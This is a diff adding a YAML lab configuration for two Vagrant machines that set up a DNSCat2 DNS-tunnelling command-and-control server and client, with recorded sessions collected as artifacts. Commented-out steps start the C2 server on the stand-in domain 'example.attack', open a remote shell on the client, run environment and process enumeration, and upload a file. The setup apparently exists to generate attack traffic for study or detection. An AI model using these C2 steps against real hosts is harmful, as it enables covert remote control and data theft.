@@ -1,0 +1,53 @@
+dns_attack_server:
+    name: dnscat_server
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.20
+    description: |
+      This sets up the DNSCat2 server.
+    setup:
+        type: script
+        val: dnscat2_server.bash
+    run:
+        type: shell
+        val: >-
+          echo "This will be run interactively";
+          #vagrant ssh dnscat_server;
+          #asciinema rec /tmp/dnscat_server.cast;
+          #ruby ./dnscat2/server/dnscat2.rb example.attack --secret 1234;
+          #window -i 1;
+          #shell;
+          #ctrl-z;
+          #window -i 2;
+          #whoami;
+          #pwd;
+          #ps aux;
+          #w;
+          #env;
+          #ctrl-z;
+          #window -i 1;
+          #upload /tmp/test-file /tmp/test-file;
+
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+
+dns_attack_client:
+    name: dnscat_client
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.30
+    description: |
+      This sets up the DoH and DNSCat2 client.
+    setup:
+      type: script
+      val: dnscat_client.bash
+    run:
+        type: shell
+        val: >-
+          echo "This will be run interactively";
+          #vagrant ssh dnscat_client;
+          #asciinema rec /tmp/dnscat_client.cast;
+          #./dnscat2/client/dnscat --dns server=127.0.0.1,domain=example.attack --secret=1234;
+          #exit;
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
